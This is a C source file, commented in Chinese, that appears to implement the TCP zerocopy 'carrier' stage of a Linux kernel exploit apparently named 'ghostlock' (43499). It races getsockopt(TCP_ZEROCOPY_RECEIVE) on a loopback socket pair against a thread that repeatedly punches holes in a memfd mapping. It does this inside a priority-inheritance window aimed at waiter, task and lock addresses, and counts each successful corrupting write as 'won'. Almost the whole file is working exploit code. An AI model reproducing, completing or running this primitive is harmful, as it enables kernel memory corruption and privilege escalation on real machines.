/**
 * @file carrier_tcp.c
 * @brief 43499 TCP zerocopy Carrier 的物理实现（getsockopt(TCP_ZEROCOPY_RECEIVE)）。
 *
 * @note 移植自 2.0.8 `route_tcp.cpp:TcpZerocopyRoute::prepare/execute/disarm/
 *       destroy` 与 `tcp_make_pair/tcp_punch_thread` 的物理 syscall 序列，改写为
 *       C11；不 include 也不链接 `legacy` 各子目录。旧 route 状态机与 fallback 不引入。
 * @note 语义边界：zerocopy 请求体（含 length/task/lock 等字段的最终偏移布局）由
 *       Kotlin 的 `frame_bytes` 提供；Native 只写唯一由自己拥有的字段
 *       `address = mapping_base + mapping_offset`（帧偏移 0），不重算 waiter/task/lock。
 * @note 线程模型：punch worker 是 Carrier 内部资源（不属于 Actor 的三个 PI worker），
 *       与旧实现一致：prepare 创建、release 先 join punch 再 munmap/close，
 *       Actor.thread_count 仍为 3。
 * @note PI 窗口：触发入口由 Actor 在 prepare 阶段绑定；窗口内只做 send/getsockopt/
 *       内联原子/yield，不 kind 读取、不分配、不加锁、不写日志、不首次触页
 *       （frame、zc 工作缓冲、映射与发送缓冲都在 prepare 建好并触页）。
 * @note 阶段：G4L-4T。
 */

#include "carrier_internal.h"

#include <errno.h>
#include <fcntl.h>
#include <linux/falloc.h>
#include <linux/memfd.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

/** @brief 操作预算上限；超过即拒绝。 */
#define GLK43499_TCP_MAX_BUDGET UINT64_C(4096)

/** @brief 超时上限（1 小时）；只做边界校验。 */
#define GLK43499_TCP_MAX_TIMEOUT_NS UINT64_C(3600000000000)

/** @brief 映射大小的最小页数（zc 地址所在页 + 至少一页余量）。 */
#define GLK43499_TCP_MIN_MAPPING_PAGES UINT64_C(2)

/**
 * @brief TCP punch worker：反复 fill + PUNCH_HOLE 维护 page cache 形态。
 * @param arg 非空 `struct glk43499_carrier_tcp *`。
 * @return 固定 NULL。
 * @note 只在 carrier 生命周期内运行；release 先置 punch_stop 再 join。
 * @note 失败写 punch_failed（errno）后退出，由触发路径判定 dirty。
 */
static void *glk43499_carrier_tcp_punch_run(void *arg) {
    struct glk43499_carrier_tcp *tcp = (struct glk43499_carrier_tcp *) arg;
    while (atomic_load(&tcp->punch_go) == 0 &&
           atomic_load(&tcp->punch_stop) == 0) {
        (void) sched_yield();
    }
    while (atomic_load(&tcp->punch_stop) == 0) {
        errno = 0;
        if (fallocate(tcp->punch_fd, 0, 0, (off_t) tcp->mapping_length) != 0) {
            atomic_store(&tcp->punch_failed, errno != 0 ? errno : EIO);
            break;
        }
        atomic_store(&tcp->punch_phase, 1);
        errno = 0;
        if (fallocate(tcp->punch_fd,
                      FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                      (off_t) tcp->page_size,
                      (off_t) (tcp->mapping_length - tcp->page_size)) != 0) {
            /* 没有洞则目标页保留旧内容，zerocopy 写入会 miss。 */
            atomic_store(&tcp->punch_failed, errno != 0 ? errno : EIO);
        }
        atomic_store(&tcp->punch_phase, 0);
        if (atomic_load(&tcp->punch_failed) != 0) break;
    }
    atomic_store(&tcp->punch_exited, 1);
    return NULL;
}

/**
 * @brief 建立 loopback TCP 连接对（listener 在中途关闭）。
 * @param tcp 非空 Carrier（写入 client_fd/server_fd）。
 * @return 0 成功；-errno 语义失败（已创建的资源在内部关闭）。
 * @note 调用方保证 client_fd/server_fd 初值为 -1。
 */
static int32_t glk43499_carrier_tcp_make_pair(
    struct glk43499_carrier_tcp *tcp) {
    const int32_t listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (listener < 0) return -errno;
    int32_t result = 0;
    int32_t one = 1;
    (void) setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in address;
    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    address.sin_port = 0;
    if (bind(listener, (struct sockaddr *) &address, sizeof(address)) != 0 ||
        listen(listener, 1) != 0) {
        result = -errno;
        if (close(listener) != 0) result = -EIO;
        return result;
    }
    socklen_t address_length = sizeof(address);
    if (getsockname(listener, (struct sockaddr *) &address, &address_length) !=
        0) {
        result = -errno;
        if (close(listener) != 0) result = -EIO;
        return result;
    }
    tcp->client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
    if (tcp->client_fd < 0) {
        result = -errno;
        if (close(listener) != 0) result = -EIO;
        return result;
    }
    if (connect(tcp->client_fd, (struct sockaddr *) &address,
                sizeof(address)) != 0) {
        result = -errno;
        if (close(tcp->client_fd) == 0) {
            tcp->client_fd = -1;
        } else {
            result = -EIO;
        }
        if (close(listener) != 0) result = -EIO;
        return result;
    }
    tcp->server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
    if (tcp->server_fd < 0) {
        result = -errno;
        if (close(tcp->client_fd) == 0) {
            tcp->client_fd = -1;
        } else {
            result = -EIO;
        }
        if (close(listener) != 0) result = -EIO;
        return result;
    }
    if (close(listener) != 0) result = -EIO;
    return result;
}

/**
 * @brief 释放 prepare 已建立但未提交的 TCP Carrier 资源。
 * @param tcp 非空 Carrier。
 * @note 只在 prepare 失败路径使用；顺序：join punch（若已启动）→ munmap → close。
 */
static int32_t glk43499_carrier_tcp_discard(
    struct glk43499_carrier_tcp *tcp) {
    int32_t clean = 1;
    if (tcp->punch_started != 0) {
        atomic_store(&tcp->punch_stop, 1);
        if (pthread_join(tcp->punch_worker, NULL) == 0) {
            tcp->punch_started = 0;
        } else {
            clean = 0;
        }
    }
    if (clean != 0 && tcp->mapping != NULL) {
        if (munmap(tcp->mapping, tcp->mapping_length) == 0) {
            tcp->mapping = NULL;
        } else {
            clean = 0;
        }
    }
    if (clean != 0) {
        if (tcp->punch_fd >= 0) {
            if (close(tcp->punch_fd) == 0) {
                tcp->punch_fd = -1;
            } else {
                clean = 0;
            }
        }
        if (clean != 0 && tcp->server_fd >= 0) {
            if (close(tcp->server_fd) == 0) {
                tcp->server_fd = -1;
            } else {
                clean = 0;
            }
        }
        if (clean != 0 && tcp->client_fd >= 0) {
            if (close(tcp->client_fd) == 0) {
                tcp->client_fd = -1;
            } else {
                clean = 0;
            }
        }
    }
    if (clean != 0) {
        free(tcp->frame);
        tcp->frame = NULL;
        free(tcp->zc_request);
        tcp->zc_request = NULL;
        free(tcp->send_buffer);
        tcp->send_buffer = NULL;
    }
    /* clean==0：保留 fd/mapping/缓冲身份，由 carrier release 逐项记账并报 retained。 */
    return clean;
}

int32_t glk43499_carrier_tcp_prepare(
    struct glk43499_carrier *carrier,
    const struct glk43499_tcp_zerocopy_spec *spec) {
    struct glk43499_carrier_tcp *tcp = &carrier->value.tcp_zerocopy_receive;
    memset(tcp, 0, sizeof(*tcp));
    tcp->client_fd = -1;
    tcp->server_fd = -1;
    tcp->punch_fd = -1;
    atomic_init(&tcp->punch_go, 0);
    atomic_init(&tcp->punch_stop, 0);
    atomic_init(&tcp->punch_phase, 0);
    atomic_init(&tcp->punch_failed, 0);
    atomic_init(&tcp->punch_exited, 0);
    if (spec == NULL || spec->frame_bytes == NULL) return -EINVAL;
    if (spec->addresses.final_waiter_address == 0 ||
        spec->addresses.final_task_address == 0 ||
        spec->addresses.final_lock_address == 0) {
        return -EINVAL;
    }
    if (spec->operation_budget == 0 ||
        spec->operation_budget > GLK43499_TCP_MAX_BUDGET) {
        return -EINVAL;
    }
    if (spec->timeout_ns == 0 ||
        spec->timeout_ns > GLK43499_TCP_MAX_TIMEOUT_NS) {
        return -EINVAL;
    }
    const long page_size_long = sysconf(_SC_PAGESIZE);
    if (page_size_long <= 0) return -EINVAL;
    const size_t page_size = (size_t) page_size_long;
    if (spec->mapping_size < (uint64_t) page_size * GLK43499_TCP_MIN_MAPPING_PAGES ||
        spec->mapping_size > GLK43499_PHYS_TCP_MAX_MAPPING ||
        spec->mapping_size % (uint64_t) page_size != 0) {
        return -EINVAL;
    }
    if (spec->mapping_offset % (uint64_t) page_size != 0) return -EINVAL;
    {
        /* 溢出安全的边界：mapping_offset + page_size 必须落在映射内。 */
        uint64_t offset_limit = 0;
        if (spec->mapping_offset > spec->mapping_size ||
            !glk43499_internal_add_u64(spec->mapping_offset,
                                       (uint64_t) page_size, &offset_limit) ||
            offset_limit > spec->mapping_size) {
            return -EINVAL;
        }
    }
    if (spec->receive_size == 0 ||
        spec->receive_size > GLK43499_PHYS_TCP_MAX_FRAME) {
        return -EINVAL;
    }
    if (spec->frame_size == 0 ||
        spec->frame_size > GLK43499_PHYS_TCP_MAX_FRAME ||
        spec->frame_size < 2 * (uint64_t) sizeof(uint64_t)) {
        return -EINVAL;
    }

    tcp->page_size = page_size;
    tcp->mapping_length = (size_t) spec->mapping_size;
    tcp->receive_size = spec->receive_size;
    tcp->mapping_offset = spec->mapping_offset;
    tcp->frame_size = spec->frame_size;
    tcp->operation_budget = spec->operation_budget;
    tcp->timeout_ns = spec->timeout_ns;

    /* 深拷贝 frame（zc 请求模板）与发送缓冲；两者都在 prepare 触页。 */
    tcp->frame = (uint8_t *) malloc((size_t) spec->frame_size);
    tcp->zc_request = (uint8_t *) malloc((size_t) spec->frame_size);
    tcp->send_buffer = (uint8_t *) malloc((size_t) spec->receive_size);
    if (tcp->frame == NULL || tcp->zc_request == NULL ||
        tcp->send_buffer == NULL) {
        free(tcp->frame);
        tcp->frame = NULL;
        free(tcp->zc_request);
        tcp->zc_request = NULL;
        free(tcp->send_buffer);
        tcp->send_buffer = NULL;
        return -ENOMEM;
    }
    memcpy(tcp->frame, spec->frame_bytes, (size_t) spec->frame_size);
    memset(tcp->zc_request, 0, (size_t) spec->frame_size);
    memset(tcp->send_buffer, (int) GLK43499_PHYS_FILL_BYTE,
           (size_t) spec->receive_size);

    int32_t pair_status = glk43499_carrier_tcp_make_pair(tcp);
    if (pair_status != 0) {
        (void) glk43499_carrier_tcp_discard(tcp);
        return pair_status;
    }

    tcp->punch_fd = (int32_t) syscall(SYS_memfd_create, "ghostlock-tcp",
                                      (uint32_t) MFD_CLOEXEC);
    if (tcp->punch_fd < 0) {
        const int32_t saved = errno;
        (void) glk43499_carrier_tcp_discard(tcp);
        return -saved;
    }
    if (fallocate(tcp->punch_fd, 0, 0, (off_t) tcp->mapping_length) != 0) {
        const int32_t saved = errno;
        (void) glk43499_carrier_tcp_discard(tcp);
        return -saved;
    }
    void *mapped = mmap(NULL, tcp->mapping_length, PROT_READ | PROT_WRITE,
                        MAP_SHARED, tcp->punch_fd, 0);
    if (mapped == MAP_FAILED) {
        const int32_t saved = errno;
        tcp->mapping = NULL;
        (void) glk43499_carrier_tcp_discard(tcp);
        return -saved;
    }
    tcp->mapping = mapped;
    {
        uint8_t *bytes = (uint8_t *) tcp->mapping;
        for (size_t offset = 0; offset < tcp->mapping_length;
             offset += tcp->page_size) {
            bytes[offset] = (uint8_t) GLK43499_PHYS_FILL_BYTE;
        }
    }

    if (pthread_create(&tcp->punch_worker, NULL,
                       glk43499_carrier_tcp_punch_run, tcp) != 0) {
        const int32_t saved = errno != 0 ? errno : EAGAIN;
        (void) glk43499_carrier_tcp_discard(tcp);
        return -saved;
    }
    tcp->punch_started = 1;
    tcp->prepared = 1;
    return 0;
}

/**
 * @brief PI 窗口内执行 TCP 触发：发送小包 + getsockopt(TCP_ZEROCOPY_RECEIVE)。
 * @param carrier 已 prepare 的 Carrier；只访问 tcp 分支。
 * @param shared PI 共享状态。
 * @note arm 序列用 1（每次 ret==0 都 arm，旧 profile 的 arm_sequence 未传入）；
 *       post_hold 用编译期常量。`frame` 每 attempt 先复制到工作缓冲再写 address，
 *       避免内核回写破坏模板。
 */
void glk43499_carrier_tcp_trigger(struct glk43499_carrier *carrier,
                                  struct glk43499_pi_shared *shared,
                                  struct glk43499_carrier_outcome *outcome) {
    struct glk43499_carrier_tcp *tcp = &carrier->value.tcp_zerocopy_receive;
    int32_t won = 0;
    atomic_store(&shared->consumer_calls, 0);
    atomic_store(&shared->consumer_success, 0);
    atomic_store(&shared->consumer_go, 0);
    atomic_store(&shared->route_delay_usec, 0);
    atomic_store(&tcp->punch_go, 1);
    const uint64_t deadline = glk43499_internal_deadline(tcp->timeout_ns);
    int32_t overflow_failed = 0;
    /* zc 请求体的工作副本：从 prepare 已触页的 frame 复制，窗口内不分配。 */
    uint8_t *const request = tcp->zc_request;

    uint64_t operations = 0;
    for (uint64_t attempt = 1; attempt <= tcp->operation_budget && won == 0;
         ++attempt) {
        if (glk43499_internal_expired(deadline)) break;
        ++operations;
        const int32_t calls_before = atomic_load(&shared->consumer_calls);
        const int32_t success_before = atomic_load(&shared->consumer_success);
        (void) send(tcp->server_fd, tcp->send_buffer, (size_t) tcp->receive_size,
                    MSG_DONTWAIT);
        for (uint64_t spin = 0;
             spin < GLK43499_PHYS_DISARM_SPIN_LIMIT &&
             atomic_load(&tcp->punch_phase) != 0;
             ++spin) {
            (void) sched_yield();
        }
        for (uint64_t spin = 0;
             spin < GLK43499_PHYS_TCP_PUNCH_SPIN &&
             atomic_load(&tcp->punch_phase) == 0 &&
             atomic_load(&tcp->punch_failed) == 0;
             ++spin) {
            (void) sched_yield();
        }
        if (atomic_load(&tcp->punch_failed) != 0) break;

        memcpy(request, tcp->frame, (size_t) tcp->frame_size);
        /* Native 唯一拥有的字段：映射地址（帧偏移 0 的 `address`）。
         * 地址加法必须过溢出检查；溢出时按物理失败收口（窗口内不分配/不日志）。 */
        uintptr_t mapping_address = 0;
        if (!glk43499_internal_add_uintptr((uintptr_t) tcp->mapping,
                                           tcp->mapping_offset,
                                           &mapping_address)) {
            overflow_failed = EOVERFLOW;
            break;
        }
        const uint64_t address = (uint64_t) mapping_address;
        memcpy(request + GLK43499_PHYS_TCP_ZC_ADDRESS_OFFSET, &address,
               sizeof(address));
        socklen_t request_length = (socklen_t) tcp->frame_size;
        errno = 0;
        const int32_t receive_result =
            getsockopt(tcp->client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE,
                       request, &request_length);
        if (receive_result == 0) {
            atomic_store(&shared->consumer_go, (int32_t) attempt);
            for (uint64_t spin = 0; spin < GLK43499_PHYS_TCP_POST_HOLD;
                 ++spin) {
                __asm__ volatile("yield" ::: "memory");
            }
            for (uint64_t spin = 0;
                 spin < GLK43499_PHYS_DISARM_SPIN_LIMIT &&
                 atomic_load(&shared->consumer_inflight) != 0;
                 ++spin) {
                (void) sched_yield();
            }
            atomic_store(&shared->consumer_go, 0);
        }
        const int32_t calls = atomic_load(&shared->consumer_calls);
        const int32_t successes = atomic_load(&shared->consumer_success);
        if (calls > calls_before && successes > success_before) {
            won = 1;
        }
    }
    if (outcome != NULL) {
        outcome->operations = operations;
        outcome->calls = (uint64_t) atomic_load(&shared->consumer_calls);
        outcome->successes = (uint64_t) atomic_load(&shared->consumer_success);
        outcome->failed =
            won != 0 ? 0
                     : (overflow_failed != 0
                            ? overflow_failed
                            : (int32_t) atomic_load(&tcp->punch_failed));
        outcome->observed_write = won;
    }
}

int32_t glk43499_carrier_tcp_disarm(struct glk43499_carrier *carrier,
                                    struct glk43499_pi_shared *shared) {
    struct glk43499_carrier_tcp *tcp = &carrier->value.tcp_zerocopy_receive;
    atomic_store(&shared->consumer_go, 0);
    atomic_store(&tcp->punch_go, 0);
    atomic_store(&tcp->punch_stop, 1);
    for (uint64_t spin = 0; spin < GLK43499_PHYS_DISARM_SPIN_LIMIT; ++spin) {
        if (atomic_load(&shared->consumer_inflight) == 0) return 1;
        (void) sched_yield();
    }
    return atomic_load(&shared->consumer_inflight) == 0 ? 1 : 0;
}

int32_t glk43499_carrier_tcp_release(
    struct glk43499_carrier_tcp *tcp_zerocopy_receive) {
    struct glk43499_carrier_tcp *tcp = tcp_zerocopy_receive;
    if (tcp->punch_started != 0) {
        atomic_store(&tcp->punch_stop, 1);
        const uint64_t deadline =
            glk43499_internal_deadline(UINT64_C(1000000000));
        while (atomic_load(&tcp->punch_exited) == 0) {
            if (glk43499_internal_expired(deadline)) {
                /* punch worker 未知引用：整链保留，不 munmap 不 close。 */
                return 0;
            }
            (void) usleep((useconds_t) GLK43499_PHYS_POLL_US);
        }
        if (pthread_join(tcp->punch_worker, NULL) != 0) return 0;
        tcp->punch_started = 0;
    }
    if (tcp->mapping != NULL) {
        if (munmap(tcp->mapping, tcp->mapping_length) != 0) {
            /* 映射释放失败：保留 fd/socket，不做部分释放。 */
            return 0;
        }
        tcp->mapping = NULL;
    }
    int32_t clean = 1;
    if (tcp->punch_fd >= 0) {
        if (close(tcp->punch_fd) == 0) {
            tcp->punch_fd = -1;
        } else {
            clean = 0;
        }
    }
    if (clean != 0 && tcp->server_fd >= 0) {
        if (close(tcp->server_fd) == 0) {
            tcp->server_fd = -1;
        } else {
            clean = 0;
        }
    }
    if (clean != 0 && tcp->client_fd >= 0) {
        if (close(tcp->client_fd) == 0) {
            tcp->client_fd = -1;
        } else {
            clean = 0;
        }
    }
    if (clean == 0) {
        /* 无法证明完整释放：保留 fd/缓冲身份（调用方按 retained 处理）。 */
        return 0;
    }
    free(tcp->frame);
    tcp->frame = NULL;
    free(tcp->zc_request);
    tcp->zc_request = NULL;
    free(tcp->send_buffer);
    tcp->send_buffer = NULL;
    tcp->prepared = 0;
    return 1;
}
